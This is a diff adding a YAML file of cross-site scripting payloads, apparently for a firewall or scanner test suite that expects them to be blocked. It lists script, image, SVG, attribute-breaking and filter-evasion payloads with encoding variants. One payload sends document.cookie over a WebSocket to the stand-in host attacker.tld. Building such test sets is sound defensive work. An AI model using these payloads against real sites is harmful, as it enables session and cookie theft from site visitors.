@@ -1,0 +1,48 @@
+suite: xss
+kind: attack
+category: xss
+expected: blocked
+severity: high
+description: "Cross-Site Scripting — Mikiri curated set"
+references: ["CWE-79", "OWASP-A03:2021"]
+
+default_placements: [url_query, header, cookie, body_urlencoded, body_json, body_multipart]
+default_encoders:
+  - [none]
+  - [url]
+  - [html_entity_hex]
+
+payloads:
+  - id: xss-basic-0001
+    raw: "<script>alert(1)</script>"
+    encoders:
+      - [none]
+      - [url]
+      - [url_double]
+      - [html_entity_dec]
+      - [html_entity_hex]
+      - [unicode_escape]
+    tags: [reflected]
+  - id: xss-img-0002
+    raw: "<img src=x onerror=alert(document.cookie)>"
+    tags: [event-handler]
+  - id: xss-svg-0003
+    raw: "<svg/onload=alert(1)>"
+    tags: [svg]
+  - id: xss-js-0004
+    raw: "javascript:alert(1)"
+    tags: [uri-scheme]
+  - id: xss-attr-0005
+    raw: "\" autofocus onfocus=alert(1) x=\""
+    tags: [attribute-break]
+  - id: xss-body-0006
+    raw: "<body onload=alert(1)>"
+    tags: [body]
+  - id: xss-encoded-0007
+    raw: "<scr<script>ipt>alert(1)</scr</script>ipt>"
+    tags: [nested, filter-evasion]
+  - id: xss-ws-0008
+    raw: "<script>new WebSocket('wss://attacker.tld').send(document.cookie)</script>"
+    placements: [ws_message]
+    encoders: [[none], [base64]]
+    tags: [websocket]
